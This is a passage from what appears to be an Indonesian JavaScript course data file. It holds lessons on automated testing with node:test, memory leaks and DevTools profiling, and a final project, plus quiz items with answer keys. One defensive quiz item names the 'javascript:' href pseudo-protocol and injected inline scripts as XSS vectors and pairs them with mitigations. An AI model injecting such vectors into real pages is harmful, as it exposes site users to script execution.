        {"tanya":"Mengapa menyisipkan URL masukan pengguna ke dalam <a href=\"...\"> tetap berbahaya meskipun teks di dalam tautannya sudah diamankan menggunakan textContent?","opsi":["Karena atribut href dapat mengubah warna teks tautan.","Karena pengguna jahat dapat memasukkan skema pseudo-protokol javascript:kodeJahat(), yang akan mengeksekusi kode JavaScript di dalam konteks halaman saat tautan tersebut diklik oleh pengguna lain.","Karena textContent otomatis menghapus atribut href.","Karena peramban akan langsung mengunduh berkas virus saat halaman dimuat."],"benar":1,"penjelasan":"Tautan dengan href=\"javascript:...\" adalah vektor klasik serangan XSS. Selalu urai URL dari pengguna menggunakan new URL(input) dan pastikan url.protocol hanya bernilai \"https:\" atau \"http:\" sebelum memasangnya ke atribut href."},
        {"tanya":"Ketika kode fetch(\"https://api.mitra.id/produk\") di halaman Anda ditolak oleh peramban dengan pesan galat kebijakan CORS (blocked by CORS policy), di manakah perbaikan yang benar harus dilakukan?","opsi":["Menambahkan mode: \"no-cors\" di front-end agar data JSON dapat dibaca oleh JavaScript.","Mengonfigurasi server tujuan (api.mitra.id) agar menyertakan header HTTP Access-Control-Allow-Origin yang mengizinkan origin situs Anda (atau meneruskan permintaan melalui server backend/reverse proxy Anda sendiri).","Mengganti fetch() dengan XMLHttpRequest.","Menghapus tag <!DOCTYPE html> di halaman front-end."],"benar":1,"penjelasan":"Kebijakan CORS ditentukan oleh header respons dari server tujuan (Access-Control-Allow-Origin). Menambahkan mode: \"no-cors\" pada fetch() hanya menghasilkan respons opaque (buram) yang isi JSON-nya tetap tidak diizinkan untuk dibaca oleh kode JavaScript Anda."},
        {"tanya":"Bagaimana header HTTP Content-Security-Policy: default-src 'self'; script-src 'self' melindungi pengguna apabila terdapat celah injeksi HTML di halaman?","opsi":["Mengenkripsi seluruh isi localStorage dengan kata sandi.","Menginstruksikan peramban untuk memblokir semua eksekusi skrip inline (seperti <script>...</script> suntikan atau atribut onerror=\"...\") serta menolak pemuatan skrip dari domain luar yang tidak terdaftar.","Menghapus seluruh elemen <form> dari halaman.","Mematikan koneksi internet pengguna."],"benar":1,"penjelasan":"Ketika direktif script-src 'self' diterapkan (tanpa 'unsafe-inline'), peramban secara ketat menolak menjalankan skrip inline apa pun di dalam dokumen HTML maupun pemanggilan eval(), sehingga melumpuhkan sebagian besar muatan serangan XSS."}
    ]
},
{
    id: 20,
    kategori: "6 · Keamanan & Kualitas",
    judul: "Pengujian Otomatis JavaScript dengan node:test dan node:assert",
    tingkat: "Lanjut", durasi: "9 mnt",
    tag: ["node:test","node:assert","node:assert/strict"],
    ringkas: "Membangun jaring pengaman kualitas perangkat lunak dengan menulis Unit Test dan Integration Test menggunakan test runner bawaan node:test dan node:assert/strict, pola Arrange-Act-Assert, menguji kode asinkron/galat, serta memeriksa perilaku situs di peramban.",
    isi: `
<h2>Mengapa Pengujian Otomatis Membuat Pengembangan Lebih Cepat?</h2>
<p>Menguji aplikasi hanya dengan mengklik-klik layar secara manual setiap kali Anda mengubah kode akan menjadi beban yang sangat lambat begitu fitur bertambah banyak. Dengan **pengujian otomatis (<em>automated tests</em>)<strong>, Anda dapat memverifikasi ratusan skenario perhitungan, validasi, dan penanganan galat hanya dalam waktu kurang dari satu detik melalui perintah </strong><code>npm test</code>**.</p>
<p>Kabar terbaik di ekosistem JavaScript modern: sejak Node.js 18 (berstatus stabil sejak Node.js 20), Anda <strong>tidak perlu lagi menginstal pustaka pihak ketiga yang berat</strong> hanya untuk menjalankan pengujian unit! Runtime Node.js sudah menyediakan modul bawaan <strong><code>node:test</code></strong> dan <strong><code>node:assert/strict</code></strong> (sebagai pembanding, repositori Kodeloka sendiri memakai <code>node:assert/strict</code> pada berkas <code>tests/site.test.mjs</code> yang dijalankan lewat <code>npm test</code>).</p>
<h2>1. Struktur Pengujian dengan Pola <em>Arrange – Act – Assert (AAA)</em></h2>
<p>Setiap pengujian yang baik mengikuti tiga langkah sederhana:</p>
<ol><li><strong>Arrange (Siapkan):</strong> Siapkan data masukan dan kondisi awal.</li><li><strong>Act (Jalankan):</strong> Panggil fungsi yang sedang diuji.</li><li><strong>Assert (Pastikan):</strong> Periksa apakah hasil keluarannya sama persis dengan yang diharapkan menggunakan <code>node:assert/strict</code>.</li></ol>
<p>Mari kita lihat contoh modul logika bisnis beserta berkas pengujiannya:</p>
<pre>// Berkas: ./kuis.js
export function hitungNilaiKuis(jawabanPengguna, kunciJawaban) {
  if (!Array.isArray(jawabanPengguna) || !Array.isArray(kunciJawaban)) {
    throw new TypeError(&quot;Jawaban dan kunci wajib berupa Array.&quot;);
  }
  if (kunciJawaban.length === 0) {
    throw new RangeError(&quot;Kunci jawaban tidak boleh kosong.&quot;);
  }

  let benar = 0;
  for (const [indeks, kunci] of kunciJawaban.entries()) {
    if (jawabanPengguna[indeks] === kunci) {
      benar++;
    }
  }

  const skor = Math.round((benar / kunciJawaban.length) * 100);
  return {
    benar,
    total: kunciJawaban.length,
    skor,
    lulus: skor &gt;= 75
  };
}</pre>
<p>Sekarang kita tulis berkas pengujiannya di <code>kuis.test.js</code>:</p>
<pre>// Berkas: ./kuis.test.js
// Jalankan langsung di terminal dengan perintah: node --test kuis.test.js
import { describe, it } from &quot;node:test&quot;;
import assert from &quot;node:assert/strict&quot;;
import { hitungNilaiKuis } from &quot;./kuis.js&quot;;

describe(&quot;hitungNilaiKuis()&quot;, () =&gt; {
  it(&quot;menghitung skor 100 dan status lulus saat semua jawaban benar&quot;, () =&gt; {
    // 1. Arrange
    const kunci = [&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;];
    const jawaban = [&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;];

    // 2. Act
    const hasil = hitungNilaiKuis(jawaban, kunci);

    // 3. Assert (deepEqual pada assert/strict memeriksa kesamaan isi objek secara ketat)
    assert.deepEqual(hasil, {
      benar: 4,
      total: 4,
      skor: 100,
      lulus: true
    });
  });

  it(&quot;menandai tidak lulus jika skor di bawah 75&quot;, () =&gt; {
    const hasil = hitungNilaiKuis([&quot;A&quot;, &quot;X&quot;, &quot;X&quot;, &quot;D&quot;], [&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;]);
    assert.equal(hasil.skor, 50);
    assert.equal(hasil.lulus, false);
  });

  it(&quot;melempar RangeError jika array kunci jawaban kosong&quot;, () =&gt; {
    // Menguji bahwa fungsi benar-benar melempar galat yang tepat!
    assert.throws(
      () =&gt; hitungNilaiKuis([], []),
      {
        name: &quot;RangeError&quot;,
        message: /tidak boleh kosong/
      }
    );
  });
});</pre>
<h2>2. Metode Asersi Penting di <code>node:assert/strict</code></h2>
<p>Selalu impor dari <strong><code>&quot;node:assert/strict&quot;</code></strong> agar semua pemeriksaan menggunakan kesetaraan ketat (<code>===</code> / <code>Object.is</code>):</p>
<table><thead><tr><th>Metode Asersi</th><th>Kegunaan</th></tr></thead><tbody><tr><td><code>assert.equal(aktual, ekspektasi)</code></td><td>Memastikan dua nilai primitif (<code>number</code>, <code>string</code>, <code>boolean</code>) sama persis (<code>===</code>).</td></tr><tr><td><code>assert.deepEqual(objAktual, objEkspektasi)</code></td><td>Membandingkan kesamaan isi <code>Object</code>, <code>Array</code>, <code>Map</code>, atau <code>Set</code> secara rekursif.</td></tr><tr><td><code>assert.ok(nilai)</code></td><td>Memastikan nilai bernilai <em>truthy</em>.</td></tr><tr><td><code>assert.match(teks, /regex/)</code></td><td>Memastikan string cocok dengan ekspresi reguler.</td></tr><tr><td><code>assert.throws(fn, detailGalat)</code></td><td>Memastikan fungsi sinkron <code>fn</code> melempar galat yang sesuai.</td></tr><tr><td><code>await assert.rejects(promiseAtauAsyncFn, detailGalat)</code></td><td>Memastikan <code>Promise</code> atau fungsi <code>async</code> ditolak (<em>rejected</em>) dengan galat yang sesuai!</td></tr></tbody></table>
<h2>3. Menguji Kode Asinkron dan <em>Mocking</em> dengan <code>t.mock</code></h2>
<p>Bagaimana cara menguji fungsi <code>async</code> yang memanggil <code>fetch()</code> tanpa harus bergantung pada koneksi internet sungguhan saat pengujian berjalan di server CI/CD?</p>
<p>Modul <code>node:test</code> menyediakan fitur <strong>Mocking bawaan (<code>t.mock</code>)</strong> untuk memalsukan fungsi atau melacak berapa kali sebuah fungsi dipanggil:</p>
<pre>import { test } from &quot;node:test&quot;;
import assert from &quot;node:assert/strict&quot;;

async function ambilJudulModul(id, fungsiFetch = globalThis.fetch) {
  const res = await fungsiFetch(\`https://kodeloka.asadinedu.com/api/modul/\${id}\`);
  if (!res.ok) throw new Error(\`Modul \${id} tidak ditemukan\`);
  const data = await res.json();
  return data.judul;
}

test(&quot;ambilJudulModul() mengembalikan judul saat respons 200 OK&quot;, async (t) =&gt; {
  // Membuat fungsi fetch tiruan (mock) yang langsung membalas tanpa jaringan
  const fetchTiruan = t.mock.fn(async () =&gt; ({
    ok: true,
    status: 200,
    json: async () =&gt; ({ id: 1, judul: &quot;Cara Web Bekerja&quot; })
  }));

  const judul = await ambilJudulModul(1, fetchTiruan);

  assert.equal(judul, &quot;Cara Web Bekerja&quot;);
  assert.equal(fetchTiruan.mock.callCount(), 1);
});

test(&quot;ambilJudulModul() menolak Promise saat status 404&quot;, async (t) =&gt; {
  const fetchGagal = t.mock.fn(async () =&gt; ({ ok: false, status: 404 }));

  // Wajib menggunakan 'await assert.rejects(...)' untuk menguji kegagalan async!
  await assert.rejects(
    async () =&gt; await ambilJudulModul(999, fetchGagal),
    { message: &quot;Modul 999 tidak ditemukan&quot; }
  );
});</pre>
<div class="callout waspada"><div class="callout-judul">⚠️ Jebakan Pengujian Asinkron: Lupa Menulis <code>await</code> di Depan <code>assert.rejects()</code>!</div><p><code>assert.rejects()</code> adalah fungsi asinkron yang mengembalikan sebuah <code>Promise</code>. Jika Anda lupa menulis <strong><code>await assert.rejects(...)</code></strong>, pengujian akan selesai sebelum Promise di dalamnya sempat diperiksa!</p></div>
<h2>Latihan Praktik: Menulis Suite Pengujian Lengkap untuk Modul Keranjang Belanja</h2>
<p>Buatlah berkas <code>keranjang.js</code> dan <code>keranjang.test.js</code>, lalu jalankan dengan <code>node --test keranjang.test.js</code>:</p>
<ol><li>Buat fungsi <code>hitungKeranjang(daftarItem)</code> yang menghitung total harga dari array <code>{ nama, harga, qty }</code> dan melempar <code>RangeError</code> jika ada <code>harga &lt; 0</code> atau <code>qty &lt;= 0</code>.</li><li>Tulis minimal 4 skenario pengujian menggunakan <code>describe</code> dan <code>it</code>: keranjang kosong menghasilkan <code>0</code>, keranjang normal menghasilkan total yang benar, item dengan <code>qty</code> negatif melempar <code>RangeError</code>, dan pengujian fungsi asinkron <code>simpanKeranjang()</code> menggunakan <code>t.mock.fn()</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://nodejs.org/docs/latest/api/test.html" rel="noopener">Test runner — Node.js Documentation</a></li><li><a href="https://nodejs.org/docs/latest/api/assert.html" rel="noopener">Assert — Node.js Documentation</a></li></ul></div>
`,
    perintah: ["node:assert/strict","npm test","node:test","===",", ","t.mock"],
    kuis: [
        {"tanya":"Mengapa untuk memeriksa apakah dua buah array [1, 2, 3] dan [1, 2, 3] memiliki isi yang sama di dalam pengujian node:assert/strict, kita harus menggunakan assert.deepEqual(arr1, arr2) dan bukan assert.equal(arr1, arr2)?","opsi":["Karena assert.equal() hanya bisa membandingkan string.","Karena assert.equal() memeriksa kesamaan referensi memori (Object.is), dan dua literal array terpisah [1, 2, 3] menempati alamat memori yang berbeda; sedangkan assert.deepEqual() memeriksa kesamaan isi elemen di dalam kedua array tersebut satu per satu.","Karena assert.deepEqual() otomatis mengurutkan isi array terlebih dahulu.","Karena assert.equal() sudah dihapus dari Node.js."],"benar":1,"penjelasan":"Di JavaScript, [1, 2, 3] === [1, 2, 3] bernilai false karena keduanya adalah dua instans objek array yang berbeda di memori. assert.deepEqual() menelusuri properti objek dan elemen array secara rekursif untuk memastikan nilainya identik."},
        {"tanya":"Metode asersi manakah dari node:assert/strict yang harus digunakan untuk memastikan bahwa sebuah fungsi async melempar galat (rejects) ketika diberikan argumen yang tidak valid?","opsi":["assert.throws(() => fungsiAsync())","await assert.rejects(async () => await fungsiAsync())","assert.equal(fungsiAsync(), Error)","assert.fail(fungsiAsync())"],"benar":1,"penjelasan":"assert.throws() hanya bekerja untuk fungsi sinkron. Karena fungsi async mengembalikan sebuah Promise yang ditolak (rejected), kita wajib menggunakan await assert.rejects(...) untuk menangkap dan memverifikasi penolakan Promise tersebut."},
        {"tanya":"Apa manfaat menyuntikkan dependensi seperti fungsiFetch = globalThis.fetch sebagai parameter pada fungsi yang akan diuji (Dependency Injection)?","opsi":["Membuat ukuran berkas JavaScript menjadi setengah lebih kecil.","Memungkinkan kita mengganti fetch asli dengan fungsi tiruan (t.mock.fn()) saat menjalankan pengujian unit sehingga pengujian berjalan sangat cepat, deterministik, dan tidak bergantung pada ketersediaan server eksternal atau koneksi internet.","Mematikan pemeriksaan CORS di peramban.","Mengubah kode asinkron menjadi kode sinkron."],"benar":1,"penjelasan":"Dengan mengizinkan fungsi menerima dependensi eksternal sebagai parameter (dengan nilai bawaan globalThis.fetch untuk penggunaan produksi normal), pengujian unit dapat dengan mudah menyuplai fungsi mock tanpa perlu melakukan penyadapan jaringan yang rumit."}
    ]
},
{
    id: 21,
    kategori: "6 · Keamanan & Kualitas",
    judul: "Manajemen Memori, Garbage Collection, Pencegahan Memory Leak, dan Profiling di DevTools",
    tingkat: "Lanjut", durasi: "9 mnt",
    tag: ["Map","performance.now()","setInterval"],
    ringkas: "Memahami bagaimana Garbage Collector JavaScript membebaskan memori berdasarkan keterjangkauan (reachability), mengenali dan memperbaiki 4 sumber kebocoran memori (memory leaks) paling umum di aplikasi web, serta mengukur kinerja dengan Performance API dan DevTools Memory Profiler.",
    isi: `
<h2>1. Bagaimana <em>Garbage Collector (GC)</em> JavaScript Bekerja?</h2>
<p>Di JavaScript, Anda tidak perlu memanggil <code>free()</code> secara manual untuk membebaskan RAM seperti di bahasa C. Mesin JavaScript memiliki <strong>Garbage Collector (GC)</strong> otomatis yang menggunakan algoritma **Mark-and-Sweep berbasis Keterjangkauan (<em>Reachability</em>)**:</p>
<pre>                     [ AKAR (ROOTS) ]
   (Variabel Global window, Tumpukan Call Stack Aktif,
                Pohon DOM Dokumen Aktif)
                 │                   │
                 ▼                   ▼
         [ Objek A ]           [ Objek B ] ───&gt; [ Objek C ]
         (Terjangkau:          (Terjangkau:     (Terjangkau:
          DIPERTAHANKAN)        DIPERTAHANKAN)   DIPERTAHANKAN)


   [ Objek D ] &lt;───&gt; [ Objek E ]
   (Tidak ada jalur rujukan dari ROOTS sama sekali!
    Meskipun D dan E saling menunjuk, keduanya TIDAK TERJANGKAU
    -&gt; DIHAPUS / DIBERSIHKAN OLEH GARBAGE COLLECTOR!)</pre>
<p>Prinsip utamanya sangat sederhana: **selama sebuah objek masih memiliki rantai referensi yang terhubung dari Akar (<em>Roots</em>), Garbage Collector TIDAK AKAN PERNAH menghapus objek tersebut dari memori RAM!**</p>
<h2>2. Empat Sumber Kebocoran Memori (<em>Memory Leaks</em>) Paling Umum di Front-End</h2>
<p>Kebocoran memori terjadi ketika sebuah objek atau elemen DOM sebenarnya <strong>sudah tidak dipakai lagi oleh pengguna</strong>, tetapi Anda tidak sengaja **masih meninggalkan tali referensi dari Akar (<em>Roots</em>) yang mengikatnya**, sehingga pemakaian RAM tab peramban membengkak terus-menerus hingga ratusan megabyte!</p>
<h3>A. Simpul DOM yang Terlepas namun Masih Disimpan di Variabel (<em>Detached DOM Nodes</em>)</h3>
<pre>// 🚫 BOCOR MEMORI:
// Meskipun #panel-besar sudah dihapus dari layar dengan .remove(),
// objek elemen beserta seluruh anak di dalamnya TIDAK BISA dibersihkan oleh GC
// karena masih dipegang oleh array global riwayatPanel!
const riwayatPanel = [];
function hapusPanel() {
  const panel = document.querySelector(&quot;#panel-besar&quot;);
  riwayatPanel.push(panel); // Menyimpan referensi kuat ke elemen DOM yang sudah dihapus!
  panel.remove();
}</pre>
<p><strong>Solusi:</strong> Jangan menyimpan referensi elemen DOM yang sudah dihapus di dalam variabel berumur panjang, atau gunakan <strong><code>WeakMap</code> / <code>WeakRef</code></strong> jika Anda perlu mengaitkan metadata ke elemen DOM!</p>
<h3>B. Timer <code>setInterval</code> yang Lupa Dihentikan (<code>clearInterval</code>)</h3>
<p>Selama sebuah <code>setInterval(() =&gt; { ... }, 1000)</code> belum dihentikan dengan <code>clearInterval(id)</code>, fungsi callback beserta **seluruh variabel dan objek besar yang berada di dalam <em>closure</em>-nya** akan tetap hidup abadi di memori!</p>
<h3>C. Event Listener pada Objek Global (<code>window</code> / <code>document</code>) yang Lupa Dilepas</h3>
<p>Jika sebuah komponen sementara memasang <code>window.addEventListener(&quot;resize&quot;, handlerKomponen)</code>, maka meskipun komponen tersebut sudah dihancurkan dari layar, objek <code>window</code> (yang merupakan <em>Root</em> abadi!) masih memegang referensi ke <code>handlerKomponen</code>.</p>
<p><strong>Cara Modern &amp; Paling Bersih Melepas Banyak Event Listener Sekaligus: Gunakan <code>AbortController</code>!</strong> Tahukah Anda bahwa <code>addEventListener</code> mendukung opsi <strong><code>{ signal: controller.signal }</code></strong>? Dengan satu panggilan <code>controller.abort()</code>, <strong>seluruh event listener yang menggunakan sinyal tersebut langsung terlepas sekaligus</strong>:</p>
<pre>class KomponenGrafik {
  #pengendaliListener = new AbortController();

  pasang() {
    const { signal } = this.#pengendaliListener;

    // Kita bisa memasang banyak listener pada window/document dengan satu signal yang sama!
    window.addEventListener(&quot;resize&quot;, () =&gt; this.hitungUlang(), { signal });
    window.addEventListener(&quot;storage&quot;, (e) =&gt; this.sinkronkan(e), { signal });
    document.addEventListener(&quot;keydown&quot;, (e) =&gt; this.tanganiTombol(e), { signal });
  }

  hancurkan() {
    // SATU baris ini otomatis melepas ketiga event listener di atas hingga bersih 100%!
    this.#pengendaliListener.abort();
  }
}</pre>
<h3>D. Cache <code>Map</code> atau Array Global yang Tumbuh Tanpa Batas (<em>Unbounded Cache</em>)</h3>
<p>Jika Anda menyimpan hasil perhitungan di dalam <code>const cache = new Map()</code> tanpa batas jumlah maksimal item, setiap masukan baru akan menambah isi <code>Map</code> selamanya. Batasi ukuran maksimum cache (misalnya hapus item paling tua dengan <code>cache.delete(cache.keys().next().value)</code> ketika <code>cache.size &gt; 100</code>).</p>
<h2>3. Mengukur Performa Kode (<code>performance.now()</code>) dan Debugging di DevTools</h2>
<h3>A. Mengukur Durasi Eksekusi Presisi Tinggi dengan <code>performance.now()</code></h3>
<p>Berbeda dengan <code>Date.now()</code> yang hanya berpresisi milidetik bulat dan dapat melompat jika jam sistem operasi disinkronkan ulang, <strong><code>performance.now()</code></strong> memberikan waktu monotonik dengan presisi pecahan milidetik (mikrodetik):</p>
<pre>const waktuMulai = performance.now();

// Jalankan operasi yang ingin diukur
prosesRibuanData();

const durasiMs = performance.now() - waktuMulai;
console.log(\`Waktu pemrosesan: \${durasiMs.toFixed(2)} ms\`);</pre>
<h3>B. Teknik Debugging JavaScript Profesional di DevTools</h3>
<ol><li><strong><code>console.table(daftarObjek)</code>:</strong> Menampilkan array berisi objek sebagai tabel interaktif yang rapi di konsol (jauh lebih mudah dibaca daripada <code>console.log</code> biasa!).</li><li><strong>Pernyataan <code>debugger;</code> dan Conditional Breakpoints:</strong> Daripada menebar puluhan <code>console.log</code>, klik kanan nomor baris kode di tab <strong>Sources / Debugger</strong> DevTools → pilih <strong>Add conditional breakpoint...</strong> (misalnya berhenti hanya ketika <code>item.id === 42 &amp;&amp; item.harga &lt; 0</code>). Saat eksekusi terjeda, Anda dapat menginspeksi seluruh isi variabel lokal, <em>closure</em>, dan <em>Call Stack</em> secara langsung!</li><li>**Mendeteksi <em>Detached DOM Elements</em> di Tab Memory:** Buka tab <strong>Memory</strong> di DevTools → pilih <strong>Heap snapshot</strong> → klik <strong>Take snapshot</strong>, lalu ketik <strong><code>Detached</code></strong> pada kotak filter pencarian kelas untuk melihat apakah ada elemen HTML yang sudah dihapus dari layar tetapi masih tersangkut di memori JavaScript!</li></ol>
<h2>Latihan Praktik: Mengelola Siklus Hidup Komponen Bebas Bocor Memori</h2>
<p>Buatlah berkas <code>kelola-memori.js</code> dan jalankan pengujiannya:</p>
<ol><li>Buat <code>class PemantauJaringan</code> yang di dalam metode <code>mulai()</code> menyalakan <code>setInterval</code> dan memasang pendengar event menggunakan <code>AbortController</code> (<code>{ signal }</code>).</li><li>Buat metode <code>hentikan()</code> yang memanggil <code>clearInterval</code> dan <code>this.#controller.abort()</code>.</li><li>Buat struktur <em>Bounded Cache</em> (cache terbatas maksimal 3 entri) menggunakan <code>Map</code> yang otomatis mengeluarkan kunci paling awal (<code>map.keys().next().value</code>) ketika entri ke-4 dimasukkan!</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener" rel="noopener"><code>EventTarget: addEventListener()</code> method (<code>signal</code> option) — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Memory_management" rel="noopener">Memory management — MDN Web Docs</a></li><li><a href="https://developer.chrome.com/docs/devtools/memory-problems" rel="noopener">Fix memory problems — Chrome DevTools</a></li></ul></div>
`,
    perintah: ["Map","performance.now()","setInterval","clearInterval","window","AbortController"],
    kuis: [
        {"tanya":"Berdasarkan algoritma Mark-and-Sweep pada Garbage Collector JavaScript, apa yang terjadi pada dua buah objek (objekA dan objekB) yang saling merujuk satu sama lain (objekA.rekan = objekB dan objekB.rekan = objekA), apabila **tidak ada lagi variabel atau referensi apa pun dari Akar (Roots) yang menunjuk ke objekA maupun objekB**?","opsi":["Kedua objek tersebut tidak akan pernah bisa dihapus dari memori karena terjadi circular reference.","Kedua objek tersebut tetap berhasil dihapus dan dibebaskan memorinya oleh Garbage Collector, karena algoritma Mark-and-Sweep memeriksa keterjangkauan (reachability) dari Roots, bukan sekadar menghitung jumlah rujukan.","Mesin JavaScript akan melempar RangeError: Maximum call stack size exceeded.","Hanya objekA yang dihapus."],"benar":1,"penjelasan":"Berbeda dengan algoritma reference counting kuno yang gagal menangani rujukan melingkar (circular reference), Garbage Collector modern di JavaScript menelusuri objek mulai dari Roots. Karena pulau objekA <-> objekB sudah tidak terjangkau dari Roots mana pun, keduanya ditandai tidak terjangkau dan langsung dibersihkan."},
        {"tanya":"Bagaimana cara paling ringkas dan modern untuk melepas beberapa addEventListener sekaligus ketika sebuah komponen antarmuka dihancurkan?","opsi":["Memanggil window.removeAllListeners().","Meneruskan opsi { signal: controller.signal } dari sebuah instans AbortController ke setiap addEventListener, lalu cukup memanggil controller.abort() satu kali saat komponen dihancurkan.","Mengubah nilai variabel komponen menjadi undefined.","Memanggil event.stopPropagation()."],"benar":1,"penjelasan":"Metode EventTarget.addEventListener() mendukung properti signal (AbortSignal). Ketika controller.abort() dipanggil, seluruh listener yang terdaftar dengan sinyal tersebut otomatis dilepas dari targetnya tanpa perlu menyimpan referensi fungsi handler satu per satu untuk removeEventListener."},
        {"tanya":"Apa yang dimaksud dengan Detached DOM Node di dalam profil memori peramban?","opsi":["Elemen HTML yang menggunakan position: absolute.","Elemen DOM yang sudah dihapus dari pohon dokumen halaman (elemen.remove()), tetapi memorinya tidak dapat dibebaskan oleh Garbage Collector karena masih ada variabel, array, atau closure JavaScript yang menyimpan referensi ke elemen tersebut.","Elemen yang berada di dalam Shadow DOM.","Elemen <img> yang gagal memuat gambar."],"benar":1,"penjelasan":"Ketika sebuah simpul DOM dilepas dari dokumen tetapi masih dirujuk oleh variabel JavaScript yang aktif, simpul tersebut (beserta seluruh induk/anak di pohon sub-DOM terkaitnya) bertahan di memori sebagai Detached DOM tree dan menjadi salah satu penyebab kebocoran memori terbesar di aplikasi web."}
    ]
},
{
    id: 22,
    kategori: "7 · Arsitektur & Ekosistem",
    judul: "Proyek Akhir Kelas JavaScript: Aplikasi Pelacak Belajar & Pencari Modul Interaktif",
    tingkat: "Lanjut", durasi: "10 mnt",
    tag: ["Set","store.js","app.js"],
    ringkas: "Membangun aplikasi front-end modular yang utuh dengan menggabungkan ES Modules, manipulasi DOM yang aman dari XSS (<template>, replaceChildren, Event Delegation), penyimpanan state di localStorage dengan sinkronisasi lintas tab, serta pengujian unit.",
    isi: `
<h2>Gambaran Proyek</h2>
<p>Selamat! Anda telah menyelesaikan seluruh fondasi bahasa JavaScript modern—mulai dari sistem tipe, fungsi dan <em>closure</em>, metode array tak-mutasi ES2023+, <code>class</code> dan field privat <code>#</code>, <code>Map</code> &amp; <code>Set</code>, penanganan galat berlapis, mekanisme <em>Event Loop</em> &amp; <code>Promise</code>, komunikasi jaringan <code>fetch()</code>, manipulasi DOM, penyimpanan peramban, ES Modules, keamanan front-end, hingga pengujian otomatis.</p>
<p>Dalam proyek akhir ini, kita akan membangun <strong>Aplikasi Pelacak Progres &amp; Pencari Modul Kodeloka</strong> yang mencerminkan arsitektur kode front-end produksi:</p>
<ol><li><strong>Modular &amp; Teruji (<code>store.js</code>):</strong> Mengelola daftar modul yang sudah selesai dipelajari menggunakan <code>Set</code> dan menyimpannya secara aman ke <code>localStorage</code> (lengkap dengan sinkronisasi lintas tab!).</li><li><strong>Cepat &amp; Responsif (<code>app.js</code>):</strong> Menyaring modul berdasarkan kata kunci pencarian (dengan <em>debounce</em> berbasis <em>closure</em>) dan tingkat kesulitan, serta merender hasilnya menggunakan elemen <code>&lt;template&gt;</code> dan <code>replaceChildren()</code>.</li><li><strong>100% Aman dari DOM XSS &amp; Efisien Memori:</strong> Seluruh teks dimasukkan melalui <code>textContent</code>, dan seluruh klik tombol <em>&quot;Tandai Selesai&quot;</em> ditangani oleh <strong>satu</strong> <em>Event Listener</em> (<em>Event Delegation</em>).</li></ol>
<h2>Struktur Berkas Proyek</h2>
<h3>1. Modul Penyimpanan &amp; Logika State (<code>store.js</code>)</h3>
<pre>// Berkas: ./store.js
const KUNCI_PENYIMPANAN = &quot;kodeloka:modul-selesai:v1&quot;;

export class PenyimpanProgres {
  #selesaiSet = new Set();
  #kunci;

  constructor(kunci = KUNCI_PENYIMPANAN) {
    this.#kunci = kunci;
    this.#muatDariLokal();
  }

  #muatDariLokal() {
    try {
      const mentah = globalThis.localStorage?.getItem(this.#kunci);
      if (!mentah) return;
      const daftarId = JSON.parse(mentah);
      if (Array.isArray(daftarId)) {
        this.#selesaiSet = new Set(daftarId.map(Number));
      }
    } catch (galat) {
      console.warn(&quot;Gagal memuat progres dari localStorage:&quot;, galat);
    }
  }

  #simpanKeLokal() {
    try {
      const json = JSON.stringify([...this.#selesaiSet]);
      globalThis.localStorage?.setItem(this.#kunci, json);
    } catch (galat) {
      console.warn(&quot;Gagal menyimpan progres ke localStorage:&quot;, galat);
    }
  }

  apakahSelesai(idModul) {
    return this.#selesaiSet.has(Number(idModul));
  }

  toggleModul(idModul) {
    const id = Number(idModul);
    if (this.#selesaiSet.has(id)) {
      this.#selesaiSet.delete(id);
    } else {
      this.#selesaiSet.add(id);
    }
    this.#simpanKeLokal();
    return this.#selesaiSet.has(id);
  }

  hitungRingkasan(totalModul) {
    const selesai = this.#selesaiSet.size;
    const persen = totalModul &gt; 0 ? Math.round((selesai / totalModul) * 100) : 0;
    return { selesai, total: totalModul, persen };
  }

  muatUlang() {
    this.#selesaiSet.clear();
    this.#muatDariLokal();
  }
}

export function saringModul(daftarModul, { kataKunci = &quot;&quot;, tingkat = &quot;semua&quot; } = {}) {
  const kueri = kataKunci.trim().toLowerCase();

  return daftarModul.filter((modul) =&gt; {
    const cocokTingkat = tingkat === &quot;semua&quot; || modul.tingkat.toLowerCase() === tingkat.toLowerCase();
    const cocokKata =
      kueri === &quot;&quot; ||
      modul.judul.toLowerCase().includes(kueri) ||
      modul.tag.some((t) =&gt; t.toLowerCase().includes(kueri));

    return cocokTingkat &amp;&amp; cocokKata;
  });
}

export function buatDebounce(fn, jedaMs = 200) {
  let timerId = null;
  return (...args) =&gt; {
    clearTimeout(timerId);
    timerId = setTimeout(() =&gt; fn(...args), jedaMs);
  };
}</pre>
<h3>2. Modul Antarmuka DOM &amp; Event Delegation (<code>app.js</code>)</h3>
<pre>// Berkas: ./app.js
import { PenyimpanProgres, saringModul, buatDebounce } from &quot;./store.js&quot;;

const DATA_MODUL_AWAL = [
  { id: 1, judul: &quot;Pengantar &amp; Tipe Data&quot;, tingkat: &quot;Dasar&quot;, durasi: &quot;15 mnt&quot;, tag: [&quot;const&quot;, &quot;typeof&quot;, &quot;??&quot;] },
  { id: 3, judul: &quot;Scope, TDZ, dan Closure&quot;, tingkat: &quot;Menengah&quot;, durasi: &quot;20 mnt&quot;, tag: [&quot;closure&quot;, &quot;lexical&quot;] },
  { id: 8, judul: &quot;Event Loop, Promise, dan Async/Await&quot;, tingkat: &quot;Lanjut&quot;, durasi: &quot;25 mnt&quot;, tag: [&quot;promise&quot;, &quot;microtask&quot;] },
  { id: 9, judul: &quot;Fetch API &amp; AbortController&quot;, tingkat: &quot;Menengah&quot;, durasi: &quot;20 mnt&quot;, tag: [&quot;fetch&quot;, &quot;json&quot;, &quot;timeout&quot;] },
  { id: 13, judul: &quot;Keamanan Front-End (XSS &amp; CSP)&quot;, tingkat: &quot;Lanjut&quot;, durasi: &quot;20 mnt&quot;, tag: [&quot;xss&quot;, &quot;cors&quot;, &quot;csp&quot;] }
];

const penyimpan = new PenyimpanProgres();
const stateFilter = { kataKunci: &quot;&quot;, tingkat: &quot;semua&quot; };

const inputCari = document.querySelector(&quot;#input-cari&quot;);
const pilihTingkat = document.querySelector(&quot;#pilih-tingkat&quot;);
